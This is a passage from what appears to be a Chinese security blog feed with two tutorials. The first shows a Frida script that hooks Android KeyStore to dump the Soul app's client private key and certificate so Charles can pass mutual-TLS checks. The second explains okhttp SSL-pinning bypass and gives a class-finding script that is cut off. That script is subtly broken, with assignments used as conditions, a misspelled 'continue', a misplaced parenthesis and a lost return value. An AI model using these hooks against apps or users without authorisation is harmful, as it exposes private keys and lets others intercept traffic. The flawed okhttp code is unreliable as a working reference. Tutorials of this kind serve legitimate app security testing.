</p><p>把这个文件复制出来保存到任意位置，第一步就完成了。但光有证书，不知道证书密码也没用。<br>所以第二部：找证书密码。<br>直接dex2jar或者jadx等工具逆向出java代码，搜索关键词“client.p12”，或者搜索java.security.KeyStore.open()方法，基本能直接找到使用证书的地方。此处我们搜索“client.p12”:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071808917.png" alt="image-20240707180842889"> </p><p>如果是jadx可以右键查找使用的地方，跟进去：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071809484.png" alt="image-20240707180905450"> </p><p>上下文中就能找到加载证书的地方，找到load方法，这个load方法第一个参数是证书文件流，第二个参数即为证书的密码，所以我们只要知道这第二个参数传进来的值是什么就可以了。</p><p>从代码可以看到第二个参数c2来源是SoulNetworkSDK.c方法，c方法返回值即为我们需要的证书密码，这时候办法就多了，直接使用Frida尝试hook即可：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071810966.png" alt="image-20240707181053744"> </p><p>这样就获得了客户端存储的证书和对应的密码了。。。</p><h2 id="4-R0Capture获取证书"><a href="#4-R0Capture获取证书" class="headerlink" title="4. R0Capture获取证书"></a>4. R0Capture获取证书</h2><p>这块直接参考R0Capture中的代码，来实现证书获取</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">storeP12</span>(<span class="params">pri, p7, p12Path, p12Password</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> X509Certificate = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>)  <span class="comment">//导入X509Certificate类</span></span><br><span class="line">            <span class="keyword">var</span> p7X509 = <span class="title class_">Java</span>.<span class="title function_">cast</span>(p7, X509Certificate);  <span class="comment">//转换为X509Certificate类型</span></span><br><span class="line">            <span class="keyword">var</span> chain = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>, [p7X509])  <span class="comment">//创建证书链数组</span></span><br><span class="line">            <span class="keyword">var</span> ks = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>).<span class="title function_">getInstance</span>(<span class="string">&quot;PKCS12&quot;</span>, <span class="string">&quot;BC&quot;</span>);  <span class="comment">//创建KeyStore对象</span></span><br><span class="line">            ks.<span class="title function_">load</span>(<span class="literal">null</span>, <span class="literal">null</span>);  <span class="comment">//加载KeyStore对象</span></span><br><span class="line">            ks.<span class="title function_">setKeyEntry</span>(<span class="string">&quot;client&quot;</span>, pri, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(p12Password).<span class="title function_">toCharArray</span>(), chain);  <span class="comment">//设置私钥和证书链到KeyStore对象</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              <span class="keyword">var</span> out = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(p12Path);  <span class="comment">//创建文件输出流</span></span><br><span class="line">              ks.<span class="title function_">store</span>(out, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(p12Password).<span class="title function_">toCharArray</span>())  <span class="comment">//保存KeyStore对象到p12文件</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (exp) &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(exp)  <span class="comment">//输出异常信息</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//在服务器校验客户端的情形下，帮助dump客户端证书，并保存为p12的格式，证书密码为r0ysue</span></span><br><span class="line">          <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore$PrivateKeyEntry&quot;</span>).<span class="property">getPrivateKey</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>()</span><br><span class="line">            <span class="keyword">var</span> packageName = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>().<span class="title function_">getPackageName</span>();</span><br><span class="line">            <span class="title function_">storeP12</span>(<span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>(), <span class="variable language_">this</span>.<span class="title function_">getCertificate</span>(), <span class="string">&#x27;/sdcard/Download/&#x27;</span> + packageName + <span class="string">&#x27;.p12&#x27;</span>, <span class="string">&#x27;r0ysue&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;dumpClinetCertificate=&gt;&quot;</span> + <span class="string">&#x27;/sdcard/Download/&#x27;</span> + packageName + <span class="string">&#x27;.p12&#x27;</span> + <span class="string">&#x27;   pwd: r0ysue&#x27;</span>); </span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore$PrivateKeyEntry&quot;</span>).<span class="property">getCertificateChain</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getCertificateChain</span>()</span><br><span class="line">            <span class="keyword">var</span> packageName = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>().<span class="title function_">getPackageName</span>();</span><br><span class="line">            <span class="title function_">storeP12</span>(<span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>(), <span class="variable language_">this</span>.<span class="title function_">getCertificate</span>(), <span class="string">&#x27;/sdcard/Download/&#x27;</span> + packageName  + <span class="string">&#x27;.p12&#x27;</span>, <span class="string">&#x27;r0ysue&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;dumpClinetCertificate=&gt;&quot;</span> + <span class="string">&#x27;/sdcard/Download/&#x27;</span> + packageName  + <span class="string">&#x27;.p12&#x27;</span> + <span class="string">&#x27;   pwd: r0ysue&#x27;</span>); </span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p>Frida加载上面的代码，来实现密钥证书自吐：</p><p>【注意】这块最好使用spawn的方式，因为APP已经初始化了，使用attach附加的方式可能dump不下来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -f com.soulapp.android -l saveCertificate.js   --no-pause</span><br></pre></td></tr></table></figure><p>运行代码后，发现没有任何反应，也没有打印console.log</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071812132.png" alt="img"> </p><p>这是因为还在开着抓包软件，导致我们不能正常访问APP，关闭抓包后，成功dump下来了证书：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071812706.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071812174.png" alt="image.png"> </p><p>证书文件详情，可以使用keystore查看：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071813634.png" alt="image.png"> </p><h2 id="5-抓包软件配置客户端证书"><a href="#5-抓包软件配置客户端证书" class="headerlink" title="5. 抓包软件配置客户端证书"></a>5. 抓包软件配置客户端证书</h2><p>这块以Charles为例，其他的类似。。。</p><p>在charles中添加APP客户端证书，可以过服务端校验。。。</p><p>这块将刚刚使用Frida dump下来的证书，加载到charles中。（charles是支持客户端证书导入的）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814844.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814266.png" alt="image.png"> </p><p>块的密码可以随便设置，就先设置为 “12345”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814607.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814129.png" alt="image.png"> </p><p>点击【Add】进行证书导入：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814985.png" alt="image.png"> </p><p>重新抓包，发现可以成功抓包了：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814577.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APP抓包 </tag>
            
            <tag> 双向证书校验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抓包进阶之通杀okhttp证书</title>
      <link href="/2024/07/07/%E6%8A%93%E5%8C%85%E8%BF%9B%E9%98%B6%E4%B9%8B%E9%80%9A%E6%9D%80okhttp%E8%AF%81%E4%B9%A6/"/>
      <url>/2024/07/07/%E6%8A%93%E5%8C%85%E8%BF%9B%E9%98%B6%E4%B9%8B%E9%80%9A%E6%9D%80okhttp%E8%AF%81%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-通杀okhttp-ssl-pinning思路"><a href="#0x01-通杀okhttp-ssl-pinning思路" class="headerlink" title="0x01 通杀okhttp-ssl-pinning思路"></a>0x01 通杀okhttp-ssl-pinning思路</h1><p>所谓通杀：就是不管有没有混淆，都可以将对应的类识别出来。。。</p><p>本质上还是hook对应的类，对应的方法。但是这些方法和类都是做了混淆处理的，怎么在所有类中识别出来特定的类和方法是通杀的关键。。。</p><h2 id="第一次校验：X509TrustManager"><a href="#第一次校验：X509TrustManager" class="headerlink" title="第一次校验：X509TrustManager"></a>第一次校验：<code>X509TrustManager</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OKHttpClient.Builder builder = new OKHttpClient.Builder();</span><br><span class="line">builder.sslSocketFactory(factory, (X509TrustManager) trustManagers[0])</span><br></pre></td></tr></table></figure><p><code>X509TrustManager</code>是<code>TrustManager</code>接口的一个实现类，主要校验是通过<code>TrustManager</code>接口下的<code>checkServerTrusted</code>函数。</p><p><code>X509TrustManager</code>是通过对<code>checkServerTrusted</code>函数进行重新实现<code>SSLPinning</code>。</p><p>上节课的hook思路为：只要是实现了<code>TrustManager</code>接口的类，都hook里面的<code>checkServerTrusted</code>方法。</p><p>本节课换思路：Hook掉<code>sslSocketFactory</code>方法，将里面的factory替换我们自己的factory</p><ul><li>factory是证书信任工厂</li><li>可以自定义factory，让其信任所有</li></ul><h2 id="第二次校验：certificatePinner"><a href="#第二次校验：certificatePinner" class="headerlink" title="第二次校验：certificatePinner"></a>第二次校验：<code>certificatePinner</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CertificatePinner.Builder cerBuilder = new CertificatePinner.Builder();</span><br><span class="line">//下面4条,对应 &quot;.taobao.com 域名的公钥</span><br><span class="line">cerBuilder.add(&quot;*.taobao.com&quot;,CertificatePinner.pin(cerBuilder))</span><br><span class="line">cerBuilder.add(&quot;*.taobao.com&quot;, &quot;sha256/IfXz1a0gWBA5oH+zasmRutUiyoZN3I8wLxHNQxk3NVo=&quot;)</span><br><span class="line">cerBuilder.add(&quot;*.taobao.com&quot;, &quot;sha256/IQBnNBEiFuhj+8x6X8XLgh01V9Ic5/V3IRQLNFFc7v4=&quot;)</span><br><span class="line">cerBuilder.add(&quot;*.taobao.com&quot;, &quot;sha256/K87oWBWM9UZfyddvDfoxL+8lpNyoUB2ptGtn0fv6G2Q=&quot;)</span><br><span class="line"></span><br><span class="line">builder.cerBuilderPinner(cerBuilder.builder())</span><br></pre></td></tr></table></figure><p>上节课思路：Hook掉<code>CertificatePinner.Builder</code>类的add方法，将其置空</p><p>本节课思路：同上，Hook掉<code>cerBuilderPinner</code>方法，将其参数<code>cerBuilder.builder()</code>置空</p><h2 id="第三次校验：hostnameVerify"><a href="#第三次校验：hostnameVerify" class="headerlink" title="第三次校验：hostnameVerify"></a>第三次校验：<code>hostnameVerify</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">builder.hostnameVerifier(new HostnameVerify)&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public boolean verify(String hostname, SSLSession session)&#123;  //传入两个参数，hostname:服务器域名  session:会话信息，里面会包含证书相关内容</span><br><span class="line">        if (hostname.equals(&#x27;www.baidu.com&#x27;))&#123;  //首先判断hostname是否为www.baidu.com(这块随便写的)</span><br><span class="line">            try&#123;</span><br><span class="line">                Certificate[] peerCertificates = session.getPeerCertificates();  //从session获取到服务器端证书相关信息</span><br><span class="line">                if(peerCertificates[0].getPublicKey().equals(myCertificate.getPublicKey()))&#123;  //判断服务器端证书公钥是否和本地证书公钥一样</span><br><span class="line">                    return true;    //若匹配成功则校验通过，校验失败，也就意味抓不到包</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;catch(SSLPeerUnverifiedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本节课思路：Hook掉<code>hostnameVerifier</code>方法，将里面的参数<code>HostnameVerify</code>替换为我们自己的</p><h1 id="0x02-X509TrustManager实现"><a href="#0x02-X509TrustManager实现" class="headerlink" title="0x02 X509TrustManager实现"></a>0x02 X509TrustManager实现</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OKHttpClient.Builder builder = new OKHttpClient.Builder();</span><br><span class="line">builder.sslSocketFactory(factory, (X509TrustManager) trustManagers[0])</span><br></pre></td></tr></table></figure><p>本节课换思路：Hook掉sslSocketFactory方法，将里面的factory替换我们自己的factory</p><p>1、builder是<code>OKHttpClient</code>的一个内部类，正常情况下直接<code>Java.use(&quot;OKHttp3.OKHttpClient$builder&quot;)</code>即可</p><p>2、针对有混淆的情况，如何定位到<code>OKHttpClient</code>这个类呢？？？</p><p>原理：可以通过这类实现了哪些接口，这个类对应的方法有什么几个参数等等。如<code>OKHttpClient</code>这个类是一个public类，没有static和final；包名为<code>OKHttp3</code>只有一层等等</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407091034330.png" alt="image.png"> </p><p>本质：我们通过这个类的相关特征，来对他进行识别！</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> classNames = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="comment">//定义了三个变量，赋值为空</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">OkhttpClinetClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CertificatePinnerClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> perfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个数组，遍历内存中的所有类，将所有类名放入数组中。</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadClasses</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">clasName,handle</span>)&#123;</span><br><span class="line">                classNames.<span class="title function_">push</span>(clasName)</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Search classes complete!&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findOkHttpClass</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>)  <span class="comment">//反射框架提供的一个类，可以判断当前这个类的一些属性，如final、static等</span></span><br><span class="line">        <span class="comment">//判读这个类是否是okhttp3.OkHttpClient</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isOkhttpClient</span>(<span class="params">clasName</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clasName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> != <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clas = <span class="title class_">Java</span>.<span class="title function_">use</span>(clasName);</span><br><span class="line">                <span class="keyword">var</span> interfaces = clas.<span class="property">class</span>.<span class="title function_">getInterfaces</span>(); <span class="comment">//通过反射获取当前类的接口</span></span><br><span class="line">                <span class="keyword">var</span> count = interfaces.<span class="property">length</span>;  <span class="comment">//获取当前类的接口数量</span></span><br><span class="line">                <span class="keyword">if</span> (count &lt; <span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> interface_ = interfaces[i];</span><br><span class="line">                    <span class="keyword">var</span> interface_Name = interface_.<span class="title function_">getName</span>();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (interface_Name.<span class="title function_">indexOf</span>(<span class="string">&quot;Cloneable&quot;</span>) &gt; <span class="number">0</span>)&#123;  <span class="comment">//OkHttpClass实现了Cloneable接口</span></span><br><span class="line">                        flag = <span class="literal">true</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (interface_Name.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &lt;= <span class="number">0</span>)&#123;  <span class="comment">//&quot;$&quot;代表内部类，不属于okhttp3的类，返回false</span></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!flag)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clas.<span class="property">class</span>.<span class="title function_">getDeclaringClass</span>().<span class="property">length</span> = <span class="number">0</span>)&#123;   <span class="comment">//判断当前类中内部类的个数，如果没有返回false</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clas.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;java.lang.Object&quot;</span>) &lt; <span class="number">0</span>)&#123;  <span class="comment">//判断当前类是否继承了Object类，如果没有返回false)</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">//如果当前类是okhttp3.OkHttpClient类的前缀，并且实现了okhttp3.OkHttpClient接口，并且没有内部类，并且继承了Object类，那么就认为是okhttp3.OkHttpClient类</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isCertificatePinner</span>(<span class="params">clasName,perfix</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!clasName.<span class="title function_">startsWith</span>(perfix))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clasName.<span class="title function_">indexOf</span>(<span class="string">&#x27;$&#x27;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clasName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>.<span class="property">length</span> != <span class="number">2</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(clasName);</span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">getInterfaces</span>().<span class="property">length</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">getDeclaringClass</span>().<span class="property">length</span> = <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>() != <span class="string">&quot;java.lang.Object&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title class_">Modifier</span>.<span class="title function_">isFinal</span>(cls.<span class="property">class</span>.<span class="title function_">getModifiers</span>()))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> flag=<span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> methods = cls.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();    <span class="comment">//获取当前类的所有方法</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; methods.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> method = methods[i];     <span class="comment">//获取当前方法</span></span><br><span class="line">                <span class="keyword">if</span> (method.<span class="title function_">getParameterCount</span>() &lt; <span class="number">1</span>)&#123;</span><br><span class="line">                    couninue;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (method.<span class="title function_">getParameterTypes</span>()[<span class="number">0</span>].<span class="title function_">getName</span>() != <span class="string">&quot;java.security.cert.Certificate&quot;</span>)&#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!flag)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            flag=<span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> filed = cls.<span class="property">class</span>.<span class="title function_">getDeclaredFields</span>();    <span class="comment">//获取当前类的所有字段    </span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; filed.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> field = filed[i];     <span class="comment">//获取当前字段</span></span><br><span class="line">                <span class="keyword">if</span> (field.<span class="title function_">getType</span>().<span class="title function_">getName</span>() == <span class="string">&quot;java.util.set&quot;</span>)&#123;  <span class="comment">//判断当前字段是否是set类型</span></span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!flag)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//console.log(&quot;Find CertificatePinnerClassName: &quot; + clasName)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">//如果当前类是okhttp3.CertificatePinner类的前缀，并且没有内部类，并且没有接口，并且继承了Object类，并且是final的，并且有set类型字段，并且有方法参数为Certificate类型，那么就认为是okhttp3.CertificatePinner类</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">isOkhttpClient</span>(classNames[i]))&#123;</span><br><span class="line">                <span class="title class_">OkhttpClinetClassName</span> = classNames[i]</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Find OkhttpClinetClassName: &quot;</span> + <span class="title class_">OkhttpClinetClassName</span>)</span><br><span class="line">                <span class="comment">//获取OkhttpClinetClassName类的前缀，比如okhttp3.OkHttpClient，得到了okhttp3.</span></span><br><span class="line">                perfix = <span class="title class_">OkhttpClinetClassName</span>.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>] + <span class="string">&quot;.&quot;</span></span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">isCertificatePinner</span>(classNames[i],perfix))&#123;</span><br><span class="line">                <span class="title class_">CertificatePinnerClassName</span> = classNames[i]</span><br><span class="line">                <span class="comment">//console.log(&quot;Find CertificatePinnerClassName: &quot; + CertificatePinnerClassName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Found class: &quot;</span> + classNames.<span class="property">length</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;OkHttp&#x27;s package prefix: &quot;</span> + perfix);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Find OkhttpClinetClassName: &quot;</span> + <span class="title class_">OkhttpClinetClassName</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Find CertificatePinnerClassName: &quot;</span> + <span class="title class_">CertificatePinnerClassName</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">OkhttpClinetClassName</span> == <span class="string">&quot;&quot;</span> || <span class="title class_">CertificatePinnerClassName</span> == <span class="string">&quot;&quot;</span> || perfix == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Can&#x27;t find OkhttpClinetClassName or CertificatePinnerClassName&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>  <span class="comment">//如果找到了okhttp3.OkHttpClient类和okhttp3.CertificatePinner类，并且得到了前缀，那么就返回true</span></span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">loadClasses</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">findOkHttpClass</span>())&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title 